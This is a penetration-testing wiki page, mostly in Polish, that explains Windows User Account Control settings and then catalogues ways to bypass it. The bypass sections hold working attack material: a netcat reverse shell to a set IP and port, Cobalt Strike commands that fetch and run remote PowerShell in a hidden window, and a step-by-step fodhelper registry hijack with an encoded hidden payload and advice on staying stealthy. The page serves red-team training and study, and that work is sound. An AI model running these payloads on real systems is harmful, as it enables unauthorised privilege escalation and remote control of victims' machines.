# UAC - Kontrola konta użytkownika

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia wyświetlanie **okna potwierdzenia przy akcjach wymagających uprawnień podwyższonych**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **potencjalnie mogą zagrozić systemowi**. Gdy UAC jest włączone, aplikacje i zadania zawsze **uruchamiają się w kontekście konta bez uprawnień administratora**, chyba że administrator eksplicitnie przyzna tym aplikacjom/zadaniom dostęp na poziomie administratora. To funkcja ułatwiająca pracę, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uważana za granicę bezpieczeństwa.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywne, konto administratora otrzymuje 2 tokeny: jeden standardowy do wykonywania zwykłych działań na poziomie zwykłego użytkownika oraz drugi z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) opisuje działanie UAC bardzo szczegółowo i obejmuje proces logowania, doświadczenie użytkownika oraz architekturę UAC. Administratorzy mogą używać zasad bezpieczeństwa do skonfigurowania sposobu działania UAC lokalnie (przy użyciu secpol.msc) lub konfigurować i dystrybuować ustawienia przez Group Policy Objects (GPO) w środowisku Active Directory. Różne ustawienia są omówione szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Istnieje 10 ustawień Group Policy, które można ustawić dla UAC. Poniższa tabela zawiera dodatkowe szczegóły:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Niektóre programy są **autoelevated automatically**, jeśli **użytkownik należy** do **grupy administratorów**. Te binaria mają w swoich _**Manifests**_ opcję _**autoElevate**_ ustawioną na _**True**_. Binarium musi być też **podpisane przez Microsoft**.

Wiele procesów auto-elevate udostępnia **funkcjonalność przez obiekty COM lub serwery RPC**, które można wywołać z procesów działających z medium integrity (z uprawnieniami zwykłego użytkownika). Zauważ, że COM (Component Object Model) i RPC (Remote Procedure Call) to metody, których programy Windows używają do komunikacji i wykonywania funkcji między różnymi procesami. Na przykład **`IFileOperation COM object`** jest zaprojektowany do obsługi operacji na plikach (kopiowanie, usuwanie, przenoszenie) i może automatycznie podnosić uprawnienia bez wyświetlania monitu.

Należy pamiętać, że mogą być wykonywane pewne kontrole, np. sprawdzanie, czy proces został uruchomiony z katalogu **System32**, co można obejść na przykład przez **wstrzyknięcie do explorer.exe** lub innego wykonywalnego pliku znajdującego się w System32.

Innym sposobem obejścia tych kontroli jest modyfikacja PEB. Każdy proces w Windows ma Process Environment Block (PEB), który zawiera ważne dane o procesie, takie jak ścieżka do wykonywalnego pliku. Poprzez modyfikację PEB, atakujący mogą sfałszować (spoofować) lokalizację swojego złośliwego procesu, sprawiając, że będzie wyglądał, jakby działał z zaufanego katalogu (np. system32). Te sfałszowane informacje oszukują obiekt COM, aby auto-elevował uprawnienia bez wyświetlania monitu.

Następnie, aby **obejść** **UAC** (podnieść z poziomu **medium** integrity do **high**), niektórzy atakujący używają tego typu binariów do **wykonywania dowolnego kodu**, ponieważ zostanie on uruchomiony z procesu o **wysokim poziomie integrity**.

Możesz **sprawdzić** _**Manifest**_ binarium używając narzędzia _**sigcheck.exe**_ z Sysinternals. (`sigcheck.exe -m <file>`) I możesz **zobaczyć** **integrity level** procesów używając _Process Explorer_ lub _Process Monitor_ (z Sysinternals).

### Check UAC

Aby potwierdzić, czy UAC jest włączone, wykonaj:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Jeśli to **`1`**, to UAC jest **włączone**, jeśli to **`0`** lub nie istnieje, to UAC jest **wyłączone**.

Następnie sprawdź, **jaki poziom** jest skonfigurowany:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)
- If **`1`** the administrator is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## Ominięcie UAC

> [!TIP]
> Należy pamiętać, że jeśli masz dostęp graficzny do ofiary, ominięcie UAC jest proste — możesz po prostu kliknąć "Yes", gdy pojawi się monit UAC

Ominięcie UAC jest potrzebne w następującej sytuacji: **UAC jest włączony, Twój proces działa w kontekście o średnim poziomie integralności, a Twój użytkownik należy do grupy administratorów**.

Ważne jest, aby wspomnieć, że **zdecydowanie trudniej jest ominąć UAC, gdy jest ustawiony na najwyższy poziom zabezpieczeń (Always), niż gdy jest w którymkolwiek z pozostałych poziomów (Default).**

### UAC wyłączony

Jeśli UAC jest już wyłączony (`ConsentPromptBehaviorAdmin` ma wartość **`0`**) możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności) używając czegoś takiego:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Bardzo** podstawowy UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell z użytkownikiem należącym do grupy Administrators, możesz **zamontować udział C$** przez SMB (system plików) lokalnie jako nowy dysk i będziesz mieć **dostęp do całego systemu plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawiony na maksymalny poziom zabezpieczeń.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają również kilka modułów umożliwiających **bypass** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) który jest **kompilacją** kilku UAC bypass exploits. Zauważ, że będziesz musiał **skompilować UACME używając visual studio lub msbuild**. Proces kompilacji utworzy kilka plików wykonywalnych (np. `Source\Akagi\outout\x64\Debug\Akagi.exe`), będziesz musiał wiedzieć **który z nich potrzebujesz.**\
Powinieneś **zachować ostrożność**, ponieważ niektóre bypasses wyświetlą **monity w innych programach**, które **powiadomią** **użytkownika**, że coś się dzieje.

UACME zawiera **numer kompilacji, od którego każda technika zaczęła działać**. Możesz wyszukać technikę wpływającą na Twoje wersje:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Dodatkowo, korzystając z [this](https://en.wikipedia.org/wiki/Windows_10_version_history) strony, otrzymasz wydanie Windows `1607` na podstawie numerów kompilacji.

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany plik wykonywalny `fodhelper.exe` jest automatycznie podnoszony (auto-elevated) we współczesnych Windows. Po uruchomieniu odpyta poniższą ścieżkę rejestru dla użytkownika bez walidacji wartości `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o Medium Integrity (użytkownik należy do grupy Administrators) uruchomić proces o High Integrity bez monitu UAC.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Kroki PowerShell (ustaw swój payload, następnie uruchom):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notatki:
- Działa, gdy bieżący użytkownik jest członkiem Administrators i poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu na 64-bitowym Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do EXE). Unikaj wywoływania UI wymagających potwierdzenia, aby zachować stealth.

#### More UAC bypass

**Wszystkie** techniki użyte tutaj do obejścia AUC **wymagają** **pełnej interaktywnej powłoki** z ofiarą (zwykła powłoka nc.exe nie wystarczy).

Możesz to uzyskać, używając sesji **meterpreter**. Zmigruj do **process**, który ma wartość **Session** równą **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass with GUI

Jeśli masz dostęp do **GUI**, możesz po prostu zaakceptować monit UAC, gdy się pojawi — w zasadzie nie potrzebujesz bypassu. Uzyskanie dostępu do GUI pozwoli ci obejść UAC.

Co więcej, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), istnieją **narzędzia uruchamiane jako administrator**, z których możesz na przykład **uruchomić** **cmd** **jako admin** bez ponownego wyświetlania monitu UAC, np. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). To może być trochę bardziej **stealthy**.

### Noisy brute-force UAC bypass

Jeśli nie zależy ci na dyskrecji, możesz zawsze **uruchomić coś w stylu** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), co będzie **prosić o podniesienie uprawnień aż użytkownik zaakceptuje**.

### Your own bypass - Basic UAC bypass methodology

Jeśli spojrzysz na **UACME**, zauważysz, że **większość bypassów UAC wykorzystuje podatność typu Dll Hijacking** (głównie zapisując złośliwą dll w _C:\Windows\System32_). [Przeczytaj to, aby nauczyć się, jak znaleźć podatność Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Polega na obserwowaniu, czy **autoElevated binary** próbuje **odczytać** z **rejestru** nazwę/ścieżkę **binarki** lub **polecenia** do **uruchomienia** (to jest bardziej interesujące, jeśli binarka szuka tych informacji w **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
